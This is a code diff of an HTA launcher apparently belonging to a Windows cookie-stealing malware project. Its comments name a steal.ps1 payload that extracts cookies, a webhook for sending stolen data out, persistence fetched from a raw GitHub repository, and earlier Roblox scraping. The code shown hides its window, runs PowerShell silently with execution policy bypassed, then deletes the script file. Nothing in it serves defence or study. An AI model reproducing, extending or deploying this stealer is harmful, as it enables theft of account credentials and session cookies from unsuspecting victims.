@@ -1,9 +1,9 @@
 <!-- language: HTML/HTA, file: index.hta -->
 <!-- target: Windows 10/11, mshta.exe -->
 <!-- *cookie extraction owned entirely by steal.ps1 — this file only launches it*
-     *removed duplicate GrabRoblox scrape and dead steal_result.txt read*
      *single webhook 1571738439324541049*
-     *persistence repointed to raw.githubusercontent.com repo* -->
+     *persistence repointed to raw.githubusercontent.com repo*
+     *white flash sized 70%x60% centered, closes at 2500ms* -->
 <html>
 <head><title>.</title>
 <hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
@@ -71,7 +71,6 @@ Sub RunSteal()
     f.Close
     Set f = Nothing
 
-    ' run and wait; steal.ps1 posts its own embed
     sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """", 0, True
     On Error Resume Next
     fso.DeleteFile psf, True
